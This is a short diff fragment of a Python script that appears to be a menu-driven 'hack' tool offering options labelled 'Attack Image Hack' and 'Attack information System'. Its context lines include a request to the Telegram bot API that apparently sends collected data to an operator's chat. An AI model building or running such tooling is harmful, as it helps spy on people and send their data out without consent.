@@ -281,7 +281,7 @@ tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={i
 #os.system(f'xdg-open https://t.me/Black_Code_22')
 
 print(W+f'''  [{E} 01 {W}] Attack Image Hack ..... 
-{W}  [{E} 02 {W}] Attack infrmation System ....''')
+{W}  [{E} {W}] ''')
 print('')
 
 black = int(input(W+' [ × ] '+'\033[1;35m  Enter opation : '+G))
